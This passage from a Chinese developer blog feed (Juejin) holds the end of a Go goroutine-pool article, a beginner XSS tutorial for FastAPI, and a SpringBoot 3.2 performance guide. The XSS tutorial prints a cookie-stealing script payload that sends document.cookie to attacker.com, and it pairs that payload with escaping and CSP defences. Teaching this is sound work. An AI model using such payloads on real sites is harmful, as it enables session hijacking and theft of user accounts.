	   <span class="hljs-comment">// 记录当前时间到 pool 对象池</span>
       p.now.Store(time.Now())  
    }  
}
</code></pre>
<h2 data-id="heading-12">总结</h2>
<p><code>ants</code> 是一个被广泛使用的高性能协程池，特别适合学习，了解协程池的实现。本文从整体到细节介绍 <code>ants</code> 的实现，希望对大家有所帮助，感谢。</p></div></div></article> <div class="article-end" data-v-539963b4="" data-v-61fb5e44=""><div class="rank-entry-bottom" data-v-539963b4="" data-v-61fb5e44=""><!----></div> <div class="tag-list-box" data-v-539963b4="" data-v-61fb5e44=""><!----><!----><!----></div></div> <!----><!----><!----><!----><!----><style>	.markdown-body { color: #828182;}</style>]]></description></item><item>    <title><![CDATA[安全小白入门(2)-----跨站脚本（XSS）]]></title>    <link>https://juejin.cn/post/7575937594350977067</link>    <guid>https://juejin.cn/post/7575937594350977067</guid>    <pubDate>2025-11-24T05:24:33.000Z</pubDate>    <description><![CDATA[<article itemscope="itemscope" itemtype="http://schema.org/Article" data-entry-id="7575937594350977067" data-draft-id="7575937594350927915" data-original-type="0" class="article" data-v-61fb5e44=""><!----> <meta itemprop="headline" content="安全小白入门(2)-----跨站脚本（XSS）"/> <meta itemprop="keywords" content="安全,前端,后端"/> <meta itemprop="datePublished" content="2025-11-24T05:24:33.000Z"/> <meta itemprop="image" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-128.png~tplv-t2oaga2asx-image.image"/> <div itemprop="author" itemscope="itemscope" itemtype="http://schema.org/Person"><meta itemprop="name" content="天下不喵"/> <meta itemprop="url" content="https://juejin.cn/user/9257993379453"/></div> <div itemprop="publisher" itemscope="itemscope" itemtype="http://schema.org/Organization"><meta itemprop="name" content="掘金"/> <div itemprop="logo" itemscope="itemscope" itemtype="https://schema.org/ImageObject"><meta itemprop="url" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-white-180.png~tplv-t2oaga2asx-image.image"/> <meta itemprop="width" content="180"/> <meta itemprop="height" content="180"/></div></div> <h1 class="article-title" data-v-61fb5e44="">
            安全小白入门(2)-----跨站脚本（XSS）
            <!----> <!----></h1> <div class="author-info-block block-hidden" data-v-61fb5e44=""><div class="author-info-box" data-v-61fb5e44=""><div class="author-name" data-v-61fb5e44=""><a href="/user/9257993379453/posts" target="_blank" rel="" class="jj-link username username ellipsis" data-v-65b50b51="" data-v-292f6e48="" data-v-61fb5e44=""><span class="name" style="max-width:160px;" data-v-65b50b51="" data-v-292f6e48="">
    天下不喵
  </span> <!----> <!----> <!----> </a></div> <div class="meta-box" data-v-61fb5e44=""><time datetime="2025-11-24T05:24:33.000Z" title="Mon Nov 24 2025 05:24:33 GMT+0000 (Coordinated Universal Time)" class="time" data-v-61fb5e44="">
                    2025-11-24
                  </time> <svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" class="read-icon" data-v-61fb5e44=""><path d="M7.90078 2.80078C4.49278 2.80078 1.74745 6.11672 0.800781 7.77469C1.74745 9.58339 4.49278 13.2008 7.90078 13.2008C11.3088 13.2008 14.0541 9.58339 15.0008 7.77469C14.0541 6.11672 11.3088 2.80078 7.90078 2.80078Z" stroke="currentColor" data-v-61fb5e44=""/><circle cx="7.89922" cy="8.00078" r="2.2" stroke="currentColor" data-v-61fb5e44=""/></svg> <span class="views-count" data-v-61fb5e44="">
                    0
                  </span> <span class="read-time" data-v-61fb5e44=""><svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" data-v-61fb5e44=""><rect width="16" height="16" fill="none" data-v-61fb5e44=""/><circle cx="8" cy="8" r="5.65625" stroke="#8A919F" data-v-61fb5e44=""/><path d="M7.69141 5.18652V8.30924H10.8141" stroke="#8A919F" stroke-linecap="round" stroke-linejoin="round" data-v-61fb5e44=""/></svg>
                    阅读2分钟
                  </span> <!----></div></div> <div style="flex:1;" data-v-61fb5e44=""/> <!----> <!----></div> <!----> <!----> <!----> <!----> <div id="article-root" itemprop="articleBody" class="main" data-v-61fb5e44=""><div class="article-viewer markdown-body result"><style>.markdown-body{word-break:break-word;line-height:1.75;font-weight:400;font-size:16px;overflow-x:hidden;color:#252933}.markdown-body h1,.markdown-body h2,.markdown-body h3,.markdown-body h4,.markdown-body h5,.markdown-body h6{line-height:1.5;margin-top:35px;margin-bottom:10px;padding-bottom:5px}.markdown-body h1{font-size:24px;line-height:38px;margin-bottom:5px}.markdown-body h2{font-size:22px;line-height:34px;padding-bottom:12px;border-bottom:1px solid #ececec}.markdown-body h3{font-size:20px;line-height:28px}.markdown-body h4{font-size:18px;line-height:26px}.markdown-body h5{font-size:17px;line-height:24px}.markdown-body h6{font-size:16px;line-height:24px}.markdown-body p{line-height:inherit;margin-top:22px;margin-bottom:22px}.markdown-body img{max-width:100%}.markdown-body hr{border:none;border-top:1px solid #ddd;margin-top:32px;margin-bottom:32px}.markdown-body code{word-break:break-word;border-radius:2px;overflow-x:auto;background-color:#fff5f5;color:#ff502c;font-size:.87em;padding:.065em .4em}.markdown-body code,.markdown-body pre{font-family:Menlo,Monaco,Consolas,Courier New,monospace}.markdown-body pre{overflow:auto;position:relative;line-height:1.75}.markdown-body pre&gt;code{font-size:12px;padding:15px 12px;margin:0;word-break:normal;display:block;overflow-x:auto;color:#333;background:#f8f8f8}.markdown-body a{text-decoration:none;color:#0269c8;border-bottom:1px solid #d1e9ff}.markdown-body a:active,.markdown-body a:hover{color:#275b8c}.markdown-body table{display:inline-block!important;font-size:12px;width:auto;max-width:100%;overflow:auto;border:1px solid #f6f6f6}.markdown-body thead{background:#f6f6f6;color:#000;text-align:left}.markdown-body tr:nth-child(2n){background-color:#fcfcfc}.markdown-body td,.markdown-body th{padding:12px 7px;line-height:24px}.markdown-body td{min-width:120px}.markdown-body blockquote{color:#666;padding:1px 23px;margin:22px 0;border-left:4px solid #cbcbcb;background-color:#f8f8f8}.markdown-body blockquote:after{display:block;content:""}.markdown-body blockquote&gt;p{margin:10px 0}.markdown-body ol,.markdown-body ul{padding-left:28px}.markdown-body ol li,.markdown-body ul li{margin-bottom:0;list-style:inherit}.markdown-body ol li .task-list-item,.markdown-body ul li .task-list-item{list-style:none}.markdown-body ol li .task-list-item ol,.markdown-body ol li .task-list-item ul,.markdown-body ul li .task-list-item ol,.markdown-body ul li .task-list-item ul{margin-top:0}.markdown-body ol ol,.markdown-body ol ul,.markdown-body ul ol,.markdown-body ul ul{margin-top:3px}.markdown-body ol li{padding-left:6px}.markdown-body .contains-task-list{padding-left:0}.markdown-body .task-list-item{list-style:none}@media (max-width:720px){.markdown-body h1{font-size:24px}.markdown-body h2{font-size:20px}.markdown-body h3{font-size:18px}}</style><style data-highlight="" data-highlight-key="juejin">.markdown-body pre,.markdown-body pre&gt;code.hljs{color:#333;background:#f8f8f8}.hljs-comment,.hljs-quote{color:#998;font-style:italic}.hljs-keyword,.hljs-selector-tag,.hljs-subst{color:#333;font-weight:700}.hljs-literal,.hljs-number,.hljs-tag .hljs-attr,.hljs-template-variable,.hljs-variable{color:teal}.hljs-doctag,.hljs-string{color:#d14}.hljs-section,.hljs-selector-id,.hljs-title{color:#900;font-weight:700}.hljs-subst{font-weight:400}.hljs-class .hljs-title,.hljs-type{color:#458;font-weight:700}.hljs-attribute,.hljs-name,.hljs-tag{color:navy;font-weight:400}.hljs-link,.hljs-regexp{color:#009926}.hljs-bullet,.hljs-symbol{color:#990073}.hljs-built_in,.hljs-builtin-name{color:#0086b3}.hljs-meta{color:#999;font-weight:700}.hljs-deletion{background:#fdd}.hljs-addition{background:#dfd}.hljs-emphasis{font-style:italic}.hljs-strong{font-weight:700}</style><h2 data-id="heading-0">跨站脚本（XSS）</h2>
<h3 data-id="heading-1">1. 漏洞原理</h3>
<p>XSS 是由于 <strong>用户输入的恶意脚本未被转义，直接在浏览器中执行</strong>，导致攻击者窃取 Cookie、伪造身份或钓鱼。FastAPI 虽以 JSON 接口为主，但若返回 HTML 内容（如模板渲染）或前端直接渲染 API 返回的用户输入，仍可能触发 XSS。</p>
<h3 data-id="heading-2">2. 攻击场景（FastAPI 漏洞代码）</h3>
<p>假设 FastAPI 接口返回包含用户输入的 HTML 页面（使用 Jinja2 模板）：</p>
<pre><code class="hljs language-python" lang="python"><span class="hljs-keyword">from</span> fastapi <span class="hljs-keyword">import</span> FastAPI, Request
<span class="hljs-keyword">from</span> fastapi.templating <span class="hljs-keyword">import</span> Jinja2Templates

app = FastAPI()
templates = Jinja2Templates(directory=<span class="hljs-string">"templates"</span>)

<span class="hljs-comment"># 漏洞接口：未转义用户输入，直接渲染到HTML</span>
<span class="hljs-meta">@app.get(<span class="hljs-params"><span class="hljs-string">"/welcome"</span></span>)</span>
<span class="hljs-keyword">def</span> <span class="hljs-title function_">welcome</span>(<span class="hljs-params">request: Request, username: <span class="hljs-built_in">str</span></span>):
    <span class="hljs-comment"># 危险！username直接拼接进HTML，若包含脚本会执行</span>
    <span class="hljs-keyword">return</span> templates.TemplateResponse(<span class="hljs-string">"welcome.html"</span>, {
        <span class="hljs-string">"request"</span>: request,
        <span class="hljs-string">"username"</span>: username  <span class="hljs-comment"># 攻击者可构造username=&lt;script&gt;恶意代码&lt;/script&gt;</span>
    })
</code></pre>
<p>对应的<code>templates/welcome.html</code>模板：</p>
<pre><code class="hljs language-html" lang="html"><span class="hljs-meta">&lt;!DOCTYPE <span class="hljs-keyword">html</span>&gt;</span>
<span class="hljs-tag">&lt;<span class="hljs-name">html</span>&gt;</span>
<span class="hljs-tag">&lt;<span class="hljs-name">head</span>&gt;</span>
    <span class="hljs-tag">&lt;<span class="hljs-name">title</span>&gt;</span>Welcome<span class="hljs-tag">&lt;/<span class="hljs-name">title</span>&gt;</span>
<span class="hljs-tag">&lt;/<span class="hljs-name">head</span>&gt;</span>
<span class="hljs-tag">&lt;<span class="hljs-name">body</span>&gt;</span>
    <span class="hljs-comment">&lt;!-- 未转义渲染用户输入 --&gt;</span>
    <span class="hljs-tag">&lt;<span class="hljs-name">h1</span>&gt;</span>Welcome, {{ username }}!<span class="hljs-tag">&lt;/<span class="hljs-name">h1</span>&gt;</span>
<span class="hljs-tag">&lt;/<span class="hljs-name">body</span>&gt;</span>
<span class="hljs-tag">&lt;/<span class="hljs-name">html</span>&gt;</span>
</code></pre>
<h4 data-id="heading-3">攻击步骤：</h4>
<ol>
<li>攻击者访问接口，构造恶意<code>username</code>：<code>/welcome?username=&lt;script&gt;alert('XSS')&lt;/script&gt;</code></li>
<li>浏览器渲染页面时，<code> &lt;script&gt;</code>标签被执行，弹出 “XSS” 提示（简单演示）。</li>
<li>进阶攻击：窃取 Cookie 并发送到攻击者服务器：<code>/welcome?username=&lt;script&gt;fetch('https://attacker.com/steal?cookie='+document.cookie)&lt;/script&gt;</code>若用户已登录，Cookie 包含会话信息，攻击者可劫持会话。</li>
</ol>
<h3 data-id="heading-4">3. 防护方案（修复代码 + 最佳实践）</h3>
<p>核心原则：<strong>对用户输入进行 HTML 转义，或避免在 HTML 中直接渲染用户输入</strong>。</p>
<h4 data-id="heading-5">修复方案 1：模板自动转义（Jinja2 默认开启）</h4>
<p>Jinja2 模板默认会对<code>{{ variable }}</code>进行 HTML 转义（将<code>&lt;</code>转义为<code>&amp;lt;</code>，<code>&gt;</code>转义为<code>&amp;gt;</code>等），恶意脚本会被当作普通文本显示。上述代码无需修改，Jinja2 已自动防护 —— 若用户输入<code>&lt;script&gt;</code>，会被转义为<code>&amp;lt;script&amp;gt;</code>，不会执行。</p>
<h4 data-id="heading-6">修复方案 2：手动转义（若需自定义渲染）</h4>
<p>若使用其他模板引擎或手动拼接 HTML，需手动转义用户输入（使用<code>html</code>模块）：</p>
<pre><code class="hljs language-python" lang="python"><span class="hljs-keyword">import</span> html

<span class="hljs-meta">@app.get(<span class="hljs-params"><span class="hljs-string">"/welcome"</span></span>)</span>
<span class="hljs-keyword">def</span> <span class="hljs-title function_">welcome</span>(<span class="hljs-params">request: Request, username: <span class="hljs-built_in">str</span></span>):
    <span class="hljs-comment"># 手动转义用户输入，确保安全</span>
    safe_username = html.escape(username)
    <span class="hljs-keyword">return</span> templates.TemplateResponse(<span class="hljs-string">"welcome.html"</span>, {
        <span class="hljs-string">"request"</span>: request,
        <span class="hljs-string">"username"</span>: safe_username
    })
</code></pre>
<h4 data-id="heading-7">额外防护：</h4>
<ul>
<li>避免返回 HTML：FastAPI 优先使用 JSON 接口，前端通过 JavaScript 渲染数据（JSON 不会执行脚本）。</li>
<li>设置安全响应头：通过<code>fastapi.middleware.cors.CORSMiddleware</code>限制跨域，或添加<code>Content-Security-Policy</code>（CSP）头，禁止加载外部脚本。</li>
</ul></div></div></article> <div class="article-end" data-v-539963b4="" data-v-61fb5e44=""><div class="rank-entry-bottom" data-v-539963b4="" data-v-61fb5e44=""><!----></div> <div class="tag-list-box" data-v-539963b4="" data-v-61fb5e44=""><!----><!----><!----></div></div> <!----><!----><!----><!----><!----><style>	.markdown-body { color: #828182;}</style>]]></description></item><item>    <title><![CDATA[SpringBoot 3.2 性能优化全攻略：7个让你的应用提速50%的关键技巧]]></title>    <link>https://juejin.cn/post/7576077034742824994</link>    <guid>https://juejin.cn/post/7576077034742824994</guid>    <pubDate>2025-11-24T04:16:54.000Z</pubDate>    <description><![CDATA[<article itemscope="itemscope" itemtype="http://schema.org/Article" data-entry-id="7576077034742824994" data-draft-id="7575413146923221007" data-original-type="0" class="article" data-v-61fb5e44=""><!----> <meta itemprop="headline" content="SpringBoot 3.2 性能优化全攻略：7个让你的应用提速50%的关键技巧"/> <meta itemprop="keywords" content="后端,前端,人工智能"/> <meta itemprop="datePublished" content="2025-11-24T04:16:54.000Z"/> <meta itemprop="image" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-128.png~tplv-t2oaga2asx-image.image"/> <div itemprop="author" itemscope="itemscope" itemtype="http://schema.org/Person"><meta itemprop="name" content="IT_陈寒"/> <meta itemprop="url" content="https://juejin.cn/user/1638743356481367"/></div> <div itemprop="publisher" itemscope="itemscope" itemtype="http://schema.org/Organization"><meta itemprop="name" content="掘金"/> <div itemprop="logo" itemscope="itemscope" itemtype="https://schema.org/ImageObject"><meta itemprop="url" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-white-180.png~tplv-t2oaga2asx-image.image"/> <meta itemprop="width" content="180"/> <meta itemprop="height" content="180"/></div></div> <h1 class="article-title" data-v-61fb5e44="">
            SpringBoot 3.2 性能优化全攻略：7个让你的应用提速50%的关键技巧
            <!----> <!----></h1> <div class="author-info-block block-hidden" data-v-61fb5e44=""><div class="author-info-box" data-v-61fb5e44=""><div class="author-name" data-v-61fb5e44=""><a href="/user/1638743356481367/posts" target="_blank" rel="" class="jj-link username username ellipsis" data-v-65b50b51="" data-v-292f6e48="" data-v-61fb5e44=""><span class="name" style="max-width:160px;" data-v-65b50b51="" data-v-292f6e48="">
    IT_陈寒
  </span> <!----> <!----> <!----> </a></div> <div class="meta-box" data-v-61fb5e44=""><time datetime="2025-11-24T04:16:54.000Z" title="Mon Nov 24 2025 04:16:54 GMT+0000 (Coordinated Universal Time)" class="time" data-v-61fb5e44="">
                    2025-11-24
                  </time> <svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" class="read-icon" data-v-61fb5e44=""><path d="M7.90078 2.80078C4.49278 2.80078 1.74745 6.11672 0.800781 7.77469C1.74745 9.58339 4.49278 13.2008 7.90078 13.2008C11.3088 13.2008 14.0541 9.58339 15.0008 7.77469C14.0541 6.11672 11.3088 2.80078 7.90078 2.80078Z" stroke="currentColor" data-v-61fb5e44=""/><circle cx="7.89922" cy="8.00078" r="2.2" stroke="currentColor" data-v-61fb5e44=""/></svg> <span class="views-count" data-v-61fb5e44="">
                    0
                  </span> <span class="read-time" data-v-61fb5e44=""><svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" data-v-61fb5e44=""><rect width="16" height="16" fill="none" data-v-61fb5e44=""/><circle cx="8" cy="8" r="5.65625" stroke="#8A919F" data-v-61fb5e44=""/><path d="M7.69141 5.18652V8.30924H10.8141" stroke="#8A919F" stroke-linecap="round" stroke-linejoin="round" data-v-61fb5e44=""/></svg>
                    阅读1分钟
                  </span> <!----></div></div> <div style="flex:1;" data-v-61fb5e44=""/> <!----> <!----></div> <!----> <!----> <!----> <!----> <div id="article-root" itemprop="articleBody" class="main" data-v-61fb5e44=""><div class="article-viewer markdown-body result"><style>.markdown-body{word-break:break-word;line-height:1.75;font-weight:400;font-size:16px;overflow-x:hidden;color:#252933}.markdown-body h1,.markdown-body h2,.markdown-body h3,.markdown-body h4,.markdown-body h5,.markdown-body h6{line-height:1.5;margin-top:35px;margin-bottom:10px;padding-bottom:5px}.markdown-body h1{font-size:24px;line-height:38px;margin-bottom:5px}.markdown-body h2{font-size:22px;line-height:34px;padding-bottom:12px;border-bottom:1px solid #ececec}.markdown-body h3{font-size:20px;line-height:28px}.markdown-body h4{font-size:18px;line-height:26px}.markdown-body h5{font-size:17px;line-height:24px}.markdown-body h6{font-size:16px;line-height:24px}.markdown-body p{line-height:inherit;margin-top:22px;margin-bottom:22px}.markdown-body img{max-width:100%}.markdown-body hr{border:none;border-top:1px solid #ddd;margin-top:32px;margin-bottom:32px}.markdown-body code{word-break:break-word;border-radius:2px;overflow-x:auto;background-color:#fff5f5;color:#ff502c;font-size:.87em;padding:.065em .4em}.markdown-body code,.markdown-body pre{font-family:Menlo,Monaco,Consolas,Courier New,monospace}.markdown-body pre{overflow:auto;position:relative;line-height:1.75}.markdown-body pre&gt;code{font-size:12px;padding:15px 12px;margin:0;word-break:normal;display:block;overflow-x:auto;color:#333;background:#f8f8f8}.markdown-body a{text-decoration:none;color:#0269c8;border-bottom:1px solid #d1e9ff}.markdown-body a:active,.markdown-body a:hover{color:#275b8c}.markdown-body table{display:inline-block!important;font-size:12px;width:auto;max-width:100%;overflow:auto;border:1px solid #f6f6f6}.markdown-body thead{background:#f6f6f6;color:#000;text-align:left}.markdown-body tr:nth-child(2n){background-color:#fcfcfc}.markdown-body td,.markdown-body th{padding:12px 7px;line-height:24px}.markdown-body td{min-width:120px}.markdown-body blockquote{color:#666;padding:1px 23px;margin:22px 0;border-left:4px solid #cbcbcb;background-color:#f8f8f8}.markdown-body blockquote:after{display:block;content:""}.markdown-body blockquote&gt;p{margin:10px 0}.markdown-body ol,.markdown-body ul{padding-left:28px}.markdown-body ol li,.markdown-body ul li{margin-bottom:0;list-style:inherit}.markdown-body ol li .task-list-item,.markdown-body ul li .task-list-item{list-style:none}.markdown-body ol li .task-list-item ol,.markdown-body ol li .task-list-item ul,.markdown-body ul li .task-list-item ol,.markdown-body ul li .task-list-item ul{margin-top:0}.markdown-body ol ol,.markdown-body ol ul,.markdown-body ul ol,.markdown-body ul ul{margin-top:3px}.markdown-body ol li{padding-left:6px}.markdown-body .contains-task-list{padding-left:0}.markdown-body .task-list-item{list-style:none}@media (max-width:720px){.markdown-body h1{font-size:24px}.markdown-body h2{font-size:20px}.markdown-body h3{font-size:18px}}</style><style data-highlight="" data-highlight-key="juejin">.markdown-body pre,.markdown-body pre&gt;code.hljs{color:#333;background:#f8f8f8}.hljs-comment,.hljs-quote{color:#998;font-style:italic}.hljs-keyword,.hljs-selector-tag,.hljs-subst{color:#333;font-weight:700}.hljs-literal,.hljs-number,.hljs-tag .hljs-attr,.hljs-template-variable,.hljs-variable{color:teal}.hljs-doctag,.hljs-string{color:#d14}.hljs-section,.hljs-selector-id,.hljs-title{color:#900;font-weight:700}.hljs-subst{font-weight:400}.hljs-class .hljs-title,.hljs-type{color:#458;font-weight:700}.hljs-attribute,.hljs-name,.hljs-tag{color:navy;font-weight:400}.hljs-link,.hljs-regexp{color:#009926}.hljs-bullet,.hljs-symbol{color:#990073}.hljs-built_in,.hljs-builtin-name{color:#0086b3}.hljs-meta{color:#999;font-weight:700}.hljs-deletion{background:#fdd}.hljs-addition{background:#dfd}.hljs-emphasis{font-style:italic}.hljs-strong{font-weight:700}</style><h2 data-id="heading-0"><strong>SpringBoot 3.2 性能优化全攻略：7个让你的应用提速50%的关键技巧</strong></h2>
<h2 data-id="heading-1">引言</h2>
<p>SpringBoot 作为 Java 生态中最流行的微服务框架之一，其易用性和开箱即用的特性深受开发者喜爱。然而，随着应用规模的扩大和业务复杂度的提升，性能问题逐渐成为开发者关注的焦点。SpringBoot 3.2 在性能方面做了多项改进，但如何充分利用这些特性并进一步优化应用，仍然是许多开发者的挑战。</p>
<p>本文将深入探讨 <strong>7 个关键技巧</strong>，涵盖从代码优化到基础设施调优的全方位实践，帮助你将 SpringBoot 应用的性能提升 <strong>50% 甚至更多</strong>。无论你是正在迁移到 SpringBoot 3.2，还是希望优化现有应用，这些技巧都能为你提供切实可行的指导。</p>
<hr/>
<h2 data-id="heading-2">主体</h2>
<h3 data-id="heading-3">1. <strong>启用 SpringBoot 3.2 的新特性：虚拟线程（Virtual Threads）</strong></h3>
<p>Java 21 引入了虚拟线程（Project Loom），而 SpringBoot 3.2 对其提供了原生支持。虚拟线程可以显著减少线程创建和上下文切换的开销，特别适合高并发场景。</p>
<h4 data-id="heading-4"><strong>如何启用？</strong></h4>
<pre><code class="hljs language-properties" lang="properties">spring.threads.virtual.enabled=true
</code></pre>
<h4 data-id="heading-5"><strong>适用场景</strong></h4>
<ul>
<li>I/O密集型任务（如数据库查询、HTTP请求）。</li>
<li>高并发微服务场景。</li>
</ul>
<h4 data-id="heading-6"><strong>注意事项</strong></h4>
<ul>
<li>CPU密集型任务可能不会受益于虚拟线程。</li>
<li>JDK必须升级至21或更高版本。</li>
</ul>
<hr/>
<h3 data-id="heading-7">2. <strong>优化 JVM 参数：选择合适的垃圾收集器</strong></h3>
<p>JVM的垃圾收集策略直接影响应用的吞吐量和延迟。SpringBoot默认使用G1 GC（Garbage-First），但在不同负载下可能需要调整或更换GC策略。</p>
<h4 data-id="heading-8"><strong>推荐配置</strong></h4>
<ul>
<li><strong>低延迟场景（如金融交易系统）</strong>: ZGC或Shenandoah GC</li>
</ul>
<pre><code class="hljs language-bash" lang="bash">java -jar your-app.jar -XX:+UseZGC -Xmx4g -Xms4g
</code></pre>
<ul>
<li><strong>高吞吐量场景（如批处理任务）</strong>: G1 GC或Parallel GC</li>
</ul>
<h4 data-id="heading-9"><strong>关键调优点</strong></h4>
<ul>
<li><code>MaxGCPauseMillis</code>：控制最大停顿时间（默认200ms）。</li>
<li><code>InitiatingHeapOccupancyPercent</code>：触发GC的堆占用百分比（默认45%）。</li>
</ul>
<hr/>
<h3 data-id="heading-10">3. <strong>利用 GraalVM Native Image （AOT编译）减少启动时间和内存占用</strong></h3>
<p>GraalVM Native Image可以将SpringBoot应用编译为本地可执行文件，极大降低启动时间和内存消耗（通常减少50%以上）。Spring Boot3.2对GraalVM的支持更加成熟。</p>
<h4 data-id="heading-11"><strong>实现步骤</strong></h4>
<p>1.添加依赖：</p>
<pre><code class="hljs language-xml" lang="xml"><span class="hljs-tag">&lt;<span class="hljs-name">dependency</span>&gt;</span>
    <span class="hljs-tag">&lt;<span class="hljs-name">groupId</span>&gt;</span>org.springframework.experimental<span class="hljs-tag">&lt;/<span class="hljs-name">groupId</span>&gt;</span>
    <span class="hljs-tag">&lt;<span class="hljs-name">artifactId</span>&gt;</span>spring-aot<span class="hljs-tag">&lt;/<span class="hljs-name">artifactId</span>&gt;</span>
    <span class="hljs-tag">&lt;<span class="hljs-name">version</span>&gt;</span>0.11.0<span class="hljs-tag">&lt;/<span class="hljs-name">version</span>&gt;</span>
<span class="hljs-tag">&lt;/<span class="hljs-name">dependency</span>&gt;</span>
</code></pre>
<p>2.生成Native镜像:</p>
<pre><code class="hljs language-bash" lang="bash">mvn spring-boot:build-image -DskipTests
</code></pre>
<h4 data-id="heading-12"><strong>优缺点分析</strong></h4>
<p>✅ 优势：极快的启动速度（毫秒级）、更低的内存占用。<br/>
❌ 限制：反射/动态代理需要额外配置、调试复杂度较高。</p>
<hr/>
<h3 data-id="heading-13">4. <strong>合理设计缓存策略：避免重复计算与I/O开销</strong></h3>
<p>缓存是提升性能的银弹之一，但错误的使用会导致数据不一致或内存泄漏。SpringBoot提供了多种缓存抽象（Caffeine、Redis等）。</p>
<h4 data-id="heading-14"><strong>最佳实践建议</strong></h4>
<p>1.<strong>多级缓存架构</strong>: Local Cache + Redis分布式缓存。</p>
<pre><code class="hljs language-java" lang="java"><span class="hljs-meta">@Cacheable(value = "userCache", key = "#id")</span>
<span class="hljs-keyword">public</span> User <span class="hljs-title function_">getUser</span><span class="hljs-params">(Long id)</span> {
    <span class="hljs-comment">// DB查询逻辑...</span>
}
</code></pre>
<p>2.<strong>避免缓存击穿</strong>:</p>
<pre><code class="hljs language-java" lang="java"><span class="hljs-meta">@Cacheable(cacheNames="users", sync=true)</span>
<span class="hljs-keyword">public</span> User <span class="hljs-title function_">findById</span><span class="hljs-params">(Long id)</span> { ... }
</code></pre>
<hr/>
<p>###5.<strong>数据库访问层优化：JPA/Hibernate调优</strong></p>
<p>数据库通常是性能瓶颈所在,以下是一些关键优化点:</p>
<p>#####a)启用Hibernate二级缓存:</p>
<pre><code class="hljs language-properties" lang="properties">spring.jpa.properties.hibernate.cache.use_second_level_cache=true
spring.jpa.properties.hibernate.cache.provider_class=org.ehcache.jsr107.EhcacheCachingProvider
</code></pre>
<p>#####b)批量处理N+1查询问题:</p>
<pre><code class="hljs language-scss" lang="scss"><span class="hljs-comment">// Bad: </span>
List&lt;User&gt; users = userRepository<span class="hljs-selector-class">.findAll</span>();
users<span class="hljs-selector-class">.forEach</span>(u -&gt; System.out.println(u.getOrders())); <span class="hljs-comment">// N+1 queries!</span>

<span class="hljs-comment">// Good:</span>
<span class="hljs-keyword">@Query</span>(<span class="hljs-string">"SELECT u FROM User u JOIN FETCH u.orders"</span>)
List&lt;User&gt; findAllWithOrders();
</code></pre>
<hr/>
<p>###6.<strong>HTTP/2与连接池配置</strong></p>
<p>网络传输效率对微服务至关重要:</p>
<p>#####a)强制启用HTTP/2(需TLS):</p>
<pre><code class="hljs language-properties" lang="properties">server.http2.enabled=true
</code></pre>
<p>#####b)WebClient连接池配置(适用于Reactive应用):</p>
<pre><code class="hljs language-scss" lang="scss">HttpClient<span class="hljs-selector-class">.create</span>()
          <span class="hljs-selector-class">.option</span>(ChannelOption.CONNECT_TIMEOUT_MILLIS,<span class="hljs-number">5000</span>)
          <span class="hljs-selector-class">.doOnConnected</span>(c-&gt;c.addHandlerLast(new ReadTimeoutHandler(<span class="hljs-number">10</span>)));
</code></pre>
<hr/>
<p>###7.<strong>监控与持续优化:使用Micrometer+Actuator</strong></p>
<p>没有度量就没有优化.Spring Boot Actuator提供丰富的监控端点:</p>
<p>#####核心指标采集配置:</p>
<pre><code class="hljs language-ini" lang="ini"><span class="hljs-attr">management.endpoints.web.exposure.include</span>=health,metrics,prometheus

<span class="hljs-comment"># Prometheus示例格式输出:</span>
http_server_requests_seconds_count{<span class="hljs-attr">uri</span>=<span class="hljs-string">"/api/users"</span>,status=<span class="hljs-string">"200"</span>}<span class="hljs-number">42</span>`
</code></pre>
<p>通过Grafana仪表盘可直观发现性能瓶颈.</p>
<hr/>
<p>##总结</p>
<p>本文介绍的7大技巧从JVM底层到架构层面全方位覆盖了Spring Boot性能优化的关键路径:</p>
<p>1️⃣利用虚拟线程处理高并发IO<br/>
2️⃣精细调节JVM参数<br/>
3️⃣原生编译技术降本增效<br/>
4️⃣智能缓存减轻后端压力<br/>
5️⃣ORM层深度调优<br/>
6️⃣网络传输协议升级<br/>
7️⃣建立可观测性体系</p>
<p>实际应用中需要根据具体场景组合搭配这些策略.A/B测试是验证效果的最佳方式.Spring Boot的强大之处在于它提供了充分的灵活性让开发者可以在"约定优于配置"的基础上进行深度定制.</p>
<p>真正的极致性能来源于对每个技术组件的深刻理解与合理运用,希望本指南能帮助您的应用突破性能瓶颈!</p></div></div></article> <div class="article-end" data-v-539963b4="" data-v-61fb5e44=""><div class="rank-entry-bottom" data-v-539963b4="" data-v-61fb5e44=""><!----></div> <div class="tag-list-box" data-v-539963b4="" data-v-61fb5e44=""><!----><!----><!----></div></div> <!----><!----><!----><!----><!----><style>	.markdown-body { color: #828182;}</style>]]></description></item><item>    <title><![CDATA[Docker 数据持久化完全指南：四种挂载方式详解与实战]]></title>    <link>https://juejin.cn/post/7575751471842295844</link>    <guid>https://juejin.cn/post/7575751471842295844</guid>    <pubDate>2025-11-24T03:43:03.000Z</pubDate>    <description><![CDATA[<article itemscope="itemscope" itemtype="http://schema.org/Article" data-entry-id="7575751471842295844" data-draft-id="7575651989985935414" data-original-type="0" class="article" data-v-61fb5e44=""><!----> <meta itemprop="headline" content="Docker 数据持久化完全指南：四种挂载方式详解与实战"/> <meta itemprop="keywords" content="后端"/> <meta itemprop="datePublished" content="2025-11-24T03:43:03.000Z"/> <meta itemprop="image" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-128.png~tplv-t2oaga2asx-image.image"/> <div itemprop="author" itemscope="itemscope" itemtype="http://schema.org/Person"><meta itemprop="name" content="IT橘子皮"/> <meta itemprop="url" content="https://juejin.cn/user/3148645291002232"/></div> <div itemprop="publisher" itemscope="itemscope" itemtype="http://schema.org/Organization"><meta itemprop="name" content="掘金"/> <div itemprop="logo" itemscope="itemscope" itemtype="https://schema.org/ImageObject"><meta itemprop="url" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-white-180.png~tplv-t2oaga2asx-image.image"/> <meta itemprop="width" content="180"/> <meta itemprop="height" content="180"/></div></div> <h1 class="article-title" 